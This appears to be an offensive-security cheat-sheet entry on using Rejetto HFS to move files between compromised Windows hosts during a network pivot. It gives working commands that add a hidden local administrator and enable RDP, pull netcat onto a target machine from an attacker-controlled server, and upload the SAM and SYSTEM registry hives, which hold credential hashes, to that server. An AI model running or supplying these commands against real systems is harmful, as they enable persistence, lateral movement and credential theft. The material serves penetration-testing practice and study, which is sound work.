# Name
Rejetto HFS (HTTP File Server)
* Allows upload/download of files (useful when attacker unable to reach victim directly)

## Usage
```
# Eg: Has access to MS01 but no access to MS02. MS01 able to reach MS02 via internal network.

# Create a local administrator on MS01 & enable RDP
net user bill P@ssw0rd /add
net localgroup administrators bill /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# On MS01, login via RDP
Use GUI to unzip the file --> double-click the hfs executable to start HTTP server
Go to http://localhost/~/admin/#/ --> hamburger icon --> shared files --> add files in virtual file system --> save

# Download files on MS02
powershell.exe iwr -uri 10.10.105.147/nc.exe -o c:\temp\nc.exe
curl http://10.10.105.147/nc.exe -o c:\temp\nc2.exe
powershell -c wget http://10.10.105.147/nc.exe -outfile c:\temp\nc3.exe

# Configure file uploads
Inside HFS admin console (http://localhost/~/admin/#/fs)
* Select "Shared Files" --> Select "Home" --> "Source on disk" put as a local directory
* Select "Who can upload" as anyone

# Upload files from MS02 to MS01
powershell -c curl.exe -F 'file=@c:\windows.old\windows\system32\SYSTEM' http://10.10.105.147
powershell -c (New-Object System.Net.WebClient).UploadFile('http://10.10.105.147', 'c:\windows.old\windows\system32\SAM')

```

## Source
https://github.com/rejetto/hfs/releases/download/v0.45.0/hfs-windows.zip

